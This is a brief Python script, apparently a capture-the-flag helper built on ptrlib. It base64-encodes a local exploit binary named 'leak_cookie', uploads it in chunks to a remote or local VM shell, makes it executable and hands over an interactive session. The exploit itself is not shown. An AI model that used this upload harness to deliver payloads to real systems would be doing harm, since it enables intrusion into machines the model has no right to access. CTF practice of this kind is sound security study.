from ptrlib import * 
import time 
import base64 
import os
import sys

def  run ( cmd ): 
    sock.sendlineafter( "$ " , cmd) 
    sock.recvline()

with  open ( "./initramfs/leak_cookie" , "rb" ) as f: 
    payload = bytes2str(base64.b64encode(f.read()))

if len(sys.argv) > 1:
	sock = Socket(sys.argv[1], int(sys.argv[2])) # remote
else:
	sock = Process( "./run.sh" )

run( 'cd /tmp' )

logger.info( "Uploading..." ) 

BUFFER_SIZE = 512

for i in  range ( 0 , len (payload), BUFFER_SIZE ): 
    print ( f"Uploading... {i:x} / { len (payload):x} " )
    run( 'echo "{}" > b64exp' . format (payload[i:i+ BUFFER_SIZE ]))
    run( 'base64 -d b64exp >> exploit' )
run( 'rm b64exp' )
run( 'chmod +x exploit' )

sock.interactive()

# run("ls -la")